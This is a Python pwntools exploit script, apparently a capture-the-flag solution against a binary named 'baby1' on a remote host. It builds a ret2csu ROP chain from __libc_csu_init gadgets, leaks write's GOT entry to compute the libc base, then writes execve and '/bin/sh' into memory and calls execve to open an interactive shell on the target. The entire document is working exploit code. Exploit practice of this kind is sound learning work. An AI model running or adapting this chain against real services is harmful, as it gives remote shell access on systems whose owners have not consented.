#!/usr/bin/env python
from pwn import *
local = 0
if local:
	p = process('./baby1')
else:
	p = remote('51.254.114.246', 1111)
elf = ELF('./baby1')
read_plt = elf.plt['read']
write_plt = elf.plt['write']
read_got = elf.got['read']
write_got = elf.got['write']
main = elf.symbols['main']
# gdb.attach(p)
buf = 0x0602000-0x100

#  4006a0:       4c 89 ea                mov    rdx,r13
#  4006a3:       4c 89 f6                mov    rsi,r14
#  4006a6:       44 89 ff                mov    edi,r15d
#  4006a9:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
#  4006ad:       48 83 c3 01             add    rbx,0x1
#  4006b1:       48 39 eb                cmp    rbx,rbp
#  4006b4:       75 ea                   jne    4006a0 <__libc_csu_init+0x40>
#  4006b6:       48 83 c4 08             add    rsp,0x8
#  4006ba:       5b                      pop    rbx
#  4006bb:       5d                      pop    rbp
#  4006bc:       41 5c                   pop    r12
#  4006be:       41 5d                   pop    r13
#  4006c0:       41 5e                   pop    r14
#  4006c2:       41 5f                   pop    r15
#  4006c4:       c3                      ret
def csu(rbx, rbp, r12, r13, r14, r15, addr):
	payload = '\x00' * 56 + p64(0x4006ba) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(0x4006a0) + '\x00' * 56 + p64(addr)
	p.sendline(payload)

# payload = cyclic(500)
offset = 56
csu(0, 1, write_got, 8, write_got, 1, main)
write = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
success('write = ' + hex(write))
write_offset = 0x0f72b0
libc_base = write - write_offset
success('libc_base = ' + hex(libc_base))

execve = libc_base + 0x0000000000cc770
system = libc_base + 0x045390
str_bin_sh = libc_base + 0x18cd57

csu(0, 1, read_got, 16, buf, 0, main)
p.send(p64(execve) + '/bin/sh\x00')

csu(0, 1, buf, 0, 0, buf + 8, main)

p.interactive()
